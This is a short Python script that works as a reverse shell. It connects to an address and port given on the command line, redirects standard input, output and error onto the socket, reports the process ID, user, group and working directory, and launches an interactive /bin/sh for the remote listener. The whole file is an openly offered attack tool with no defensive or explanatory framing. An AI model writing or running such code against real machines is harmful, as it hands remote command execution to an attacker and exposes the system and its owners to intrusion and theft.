#!/usr/bin/env python3
import subprocess as sp
import socket
import sys
import os


client = socket.socket()
client.connect((sys.argv[1], int(sys.argv[2])))

client_fileno = client.fileno()
os.dup2(client_fileno, 1)
os.dup2(client_fileno, 2)
os.dup2(client_fileno, 0)

client_pid = os.getpid()
client_uid = os.getuid()
client_gid = os.getgid()
client_cwd = os.getcwd()

while True:
    print('rShell successfully started!')
    print('PID:{pid}|UID:{uid}|GID:{gid}|CWD:{cwd}'.format(
        pid=client_pid, uid=client_uid, gid=client_gid, cwd=client_cwd
    ))

    sp.call(['/bin/sh', '-i'], shell=True)

print('End of shell...')
client.close()
